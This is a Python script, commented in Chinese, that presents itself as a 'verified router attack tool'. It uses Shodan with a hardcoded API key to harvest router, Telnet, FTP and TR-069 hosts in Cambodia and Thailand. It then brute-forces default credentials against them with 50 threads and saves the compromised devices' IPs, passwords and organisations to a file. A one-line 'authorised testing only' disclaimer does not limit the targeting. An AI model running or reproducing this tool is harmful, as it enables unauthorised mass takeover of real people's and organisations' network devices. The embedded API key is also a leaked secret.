#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
验证型路由器攻击工具
确保每个成功都是真实可用的，避免误报
"""

import requests
import socket
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor
import random
import re

class VerifiedRouterAttack:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base_url = "https://api.shodan.io"
        
        # 更精确的凭据
        self.creds = [
            ('admin', 'admin'),
            ('admin', ''),
            ('admin', 'password'),
            ('admin', '1234'),
            ('root', 'admin'),
            ('cisco', 'cisco'),
            ('admin', 'cisco'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('user', 'user')
        ]
        
        # 验证结果
        self.verified_pwned = []
        self.failed = []
        self.false_positives = []
        
    def get_more_targets(self, country_code, limit=200):
        """获取更多目标"""
        print(f"🔍 获取 {country_code} 的更多目标...")
        
        targets = []
        
        # 扩展搜索查询
        queries = [
            f'country:{country_code} title:"router"',
            f'country:{country_code} title:"TP-Link"',
            f'country:{country_code} title:"D-Link"',
            f'country:{country_code} title:"Tenda"',
            f'country:{country_code} title:"Cisco"',
            f'country:{country_code} title:"Netgear"',
            f'country:{country_code} title:"ASUS"',
            f'country:{country_code} port:80 title:"admin"',
            f'country:{country_code} port:8080',
            f'country:{country_code} port:443 title:"login"',
            f'country:{country_code} port:23',  # Telnet
            f'country:{country_code} port:21',  # FTP
            f'country:{country_code} port:7547',  # TR-069
            f'country:{country_code} port:9000',
            f'country:{country_code} port:9090',
            f'country:{country_code} product:"router"',
            f'country:{country_code} product:"gateway"',
            f'country:{country_code} os:"embedded"',
            f'country:{country_code} os:"linux" title:"router"'
        ]
        
        for query in queries:
            try:
                url = f"{self.base_url}/shodan/host/search"
                params = {
                    'key': self.api_key,
                    'query': query,
                    'limit': limit // len(queries)
                }
                
                response = requests.get(url, params=params, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    for match in data.get('matches', []):
                        targets.append({
                            'ip': match.get('ip_str', ''),
                            'port': match.get('port', 80),
                            'title': match.get('title', ''),
                            'country': match.get('location', {}).get('country_name', ''),
                            'org': match.get('org', ''),
                            'product': match.get('product', ''),
                            'version': match.get('version', ''),
                            'banner': match.get('banner', '')
                        })
                
                time.sleep(0.5)  # API限制
                
            except Exception as e:
                print(f"❌ 查询失败: {e}")
                continue
        
        # 去重
        unique_targets = []
        seen_ips = set()
        for target in targets:
            if target['ip'] not in seen_ips:
                unique_targets.append(target)
                seen_ips.add(target['ip'])
        
        print(f"✅ 获取到 {len(unique_targets)} 个唯一目标")
        return unique_targets
    
    def verify_access(self, ip, port, username, password):
        """验证真实访问权限"""
        try:
            # 尝试HTTP Basic Auth
            auth = (username, password)
            response = requests.get(
                f'http://{ip}:{port}',
                auth=auth,
                timeout=5,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                content = response.text.lower()
                
                # 检查是否真的进入了管理界面
                if any(keyword in content for keyword in [
                    'dashboard', 'admin panel', 'management', 'configuration',
                    'settings', 'system', 'network', 'wireless', 'wan', 'lan',
                    'router', 'gateway', 'firmware', 'status', 'monitor'
                ]):
                    # 进一步验证 - 尝试访问管理功能
                    admin_endpoints = [
                        '/admin/', '/management/', '/config/', '/settings/',
                        '/system/', '/network/', '/wireless/', '/status/'
                    ]
                    
                    for endpoint in admin_endpoints:
                        try:
                            admin_response = requests.get(
                                f'http://{ip}:{port}{endpoint}',
                                auth=auth,
                                timeout=3
                            )
                            if admin_response.status_code == 200:
                                return {
                                    'verified': True,
                                    'method': 'HTTP Basic Auth',
                                    'admin_endpoint': endpoint,
                                    'title': self.extract_title(response.text),
                                    'content_length': len(response.text)
                                }
                        except:
                            continue
                    
                    return {
                        'verified': True,
                        'method': 'HTTP Basic Auth',
                        'admin_endpoint': 'main_page',
                        'title': self.extract_title(response.text),
                        'content_length': len(response.text)
                    }
            
            # 尝试POST登录
            login_data = {
                'username': username,
                'password': password,
                'user': username,
                'pass': password,
                'login': 'Login',
                'submit': 'Login',
                'action': 'login'
            }
            
            response = requests.post(
                f'http://{ip}:{port}/login',
                data=login_data,
                timeout=5,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            if response.status_code == 200:
                content = response.text.lower()
                
                # 检查登录是否成功
                if not any(keyword in content for keyword in [
                    'login', 'password', 'username', 'error', 'invalid', 'failed'
                ]):
                    return {
                        'verified': True,
                        'method': 'POST Login',
                        'admin_endpoint': 'login_success',
                        'title': self.extract_title(response.text),
                        'content_length': len(response.text)
                    }
            
            return {'verified': False, 'reason': 'No valid admin access detected'}
            
        except Exception as e:
            return {'verified': False, 'reason': f'Error: {str(e)}'}
    
    def extract_title(self, html_content):
        """提取页面标题"""
        try:
            title_match = re.search(r'<title>(.*?)</title>', html_content, re.IGNORECASE)
            if title_match:
                return title_match.group(1).strip()
        except:
            pass
        return 'No Title'
    
    def attack_single_target(self, target):
        """攻击单个目标并验证"""
        ip = target['ip']
        port = target['port']
        
        for username, password in self.creds:
            try:
                # 验证访问
                verification = self.verify_access(ip, port, username, password)
                
                if verification['verified']:
                    result = {
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'method': verification['method'],
                        'admin_endpoint': verification['admin_endpoint'],
                        'title': verification['title'],
                        'content_length': verification['content_length'],
                        'country': target['country'],
                        'org': target['org'],
                        'product': target['product'],
                        'version': target['version'],
                        'verified': True,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                    self.verified_pwned.append(result)
                    print(f"✅ 验证成功: {ip}:{port} - {username}:{password} - {target['country']} - {verification['method']}")
                    return result
                
            except Exception as e:
                continue
        
        # 记录失败
        self.failed.append({
            'ip': ip,
            'port': port,
            'country': target['country'],
            'org': target['org'],
            'reason': 'All credentials failed'
        })
        return None
    
    def mass_attack_verified(self, targets, max_threads=50):
        """批量攻击并验证"""
        print(f"🚀 开始验证攻击 {len(targets)} 个目标...")
        print(f"📊 使用 {max_threads} 个线程")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [executor.submit(self.attack_single_target, target) for target in targets]
            
            for i, future in enumerate(futures):
                try:
                    result = future.result(timeout=30)
                    if (i + 1) % 20 == 0:
                        print(f"📊 已处理 {i + 1}/{len(targets)} 个目标")
                        
                except Exception as e:
                    if (i + 1) % 20 == 0:
                        print(f"📊 已处理 {i + 1}/{len(targets)} 个目标")
        
        return self.verified_pwned
    
    def print_verified_results(self):
        """打印验证结果"""
        print(f"\n" + "="*80)
        print(f"🎯 验证型路由器攻击结果")
        print(f"="*80)
        print(f"验证成功: {len(self.verified_pwned)} 台")
        print(f"攻击失败: {len(self.failed)} 台")
        
        if self.verified_pwned:
            print(f"\n🏆 验证成功的设备:")
            for i, pwn in enumerate(self.verified_pwned, 1):
                print(f"   {i}. {pwn['ip']}:{pwn['port']} - {pwn['username']}:{pwn['password']}")
                print(f"      国家: {pwn['country']} | 组织: {pwn['org']}")
                print(f"      方法: {pwn['method']} | 端点: {pwn['admin_endpoint']}")
                print(f"      标题: {pwn['title']} | 内容长度: {pwn['content_length']}")
                print(f"      产品: {pwn['product']} | 版本: {pwn['version']}")
                print()
            
            # 按国家统计
            countries = {}
            for pwn in self.verified_pwned:
                country = pwn['country']
                countries[country] = countries.get(country, 0) + 1
            
            print(f"📊 按国家统计:")
            for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True):
                print(f"   {country}: {count} 台")
    
    def save_verified_results(self, filename='verified_router_attack.json'):
        """保存验证结果"""
        results = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'verified_successful': self.verified_pwned,
            'failed': self.failed,
            'total_verified': len(self.verified_pwned),
            'total_failed': len(self.failed)
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2)
        print(f"💾 验证结果已保存到: {filename}")

def main():
    """主函数"""
    print("🚀 验证型路由器攻击工具")
    print("⚠️  注意: 此工具仅用于授权的安全测试")
    print("🔍 确保每个成功都是真实可用的，避免误报")
    
    api_key = "8U3fd9BSqyzentffLrhocQm7rSvy44jx"
    attacker = VerifiedRouterAttack(api_key)
    
    # 获取更多目标
    print("\n🇰🇭 获取柬埔寨目标...")
    cambodia_targets = attacker.get_more_targets('KH', limit=300)
    
    print("\n🇹🇭 获取泰国目标...")
    thailand_targets = attacker.get_more_targets('TH', limit=300)
    
    # 合并目标
    all_targets = cambodia_targets + thailand_targets
    print(f"\n📋 总目标数量: {len(all_targets)} 个IP")
    
    if all_targets:
        # 开始验证攻击
        results = attacker.mass_attack_verified(all_targets)
        
        # 显示结果
        attacker.print_verified_results()
        
        # 保存结果
        attacker.save_verified_results()
    else:
        print("❌ 未获取到任何目标")
    
    print(f"\n💡 验证攻击技巧:")
    print(f"   1. 多重验证确保真实访问")
    print(f"   2. 检查管理界面特征")
    print(f"   3. 验证管理功能端点")
    print(f"   4. 避免误报和假阳性")
    print(f"   5. 确保每个成功都是可用的")

if __name__ == "__main__":
    main()